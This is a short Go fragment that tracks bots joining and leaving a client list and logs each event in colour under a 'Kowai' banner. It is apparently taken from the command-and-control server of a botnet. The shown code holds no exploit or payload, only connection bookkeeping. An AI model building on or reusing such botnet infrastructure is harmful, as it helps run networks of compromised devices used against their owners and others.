...
func (this *ClientList) AddClient(c *Bot) {
    this.addQueue <- c
	fmt.Printf("\033[90m[\033[1;35mKowai\033[90m] \033[1;32mJoining \033[1;33m -- \033[1;35m%s \033[1;33m[\033[1;35m%s\033[33m]\n", c.conn.RemoteAddr(), c.source)
}

func (this *ClientList) DelClient(c *Bot) {
    this.delQueue <- c
    fmt.Printf("\033[90m[\033[1;35mKowai\033[90m] \033[0;31mDied \033[1;33m -- \033[1;35m%s \033[1;33m[\033[1;35m%s\033[1;33m]\n", c.conn.RemoteAddr(), c.source)
}
